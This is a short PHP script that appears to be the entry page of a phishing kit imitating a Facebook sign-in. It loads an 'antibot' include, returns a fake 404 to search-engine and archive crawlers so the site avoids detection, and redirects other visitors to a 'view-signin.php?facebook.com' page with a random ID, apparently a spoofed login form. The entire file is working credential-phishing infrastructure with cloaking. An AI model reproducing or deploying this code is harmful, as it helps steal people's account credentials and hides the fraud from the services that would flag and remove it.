<?php
	
	
	include "antibot.php"; 
	if(!empty($_SERVER['HTTP_USER_AGENT'])) {

		$userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");

		if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {

			header('HTTP/1.0 404 Not Found');

        exit;

		}

	}
	
	$rand = rand(10000000,1000000000);
	
	header('Location: view-signin.php?facebook.com&mUniqueID=' . $rand);
	
	exit;


?>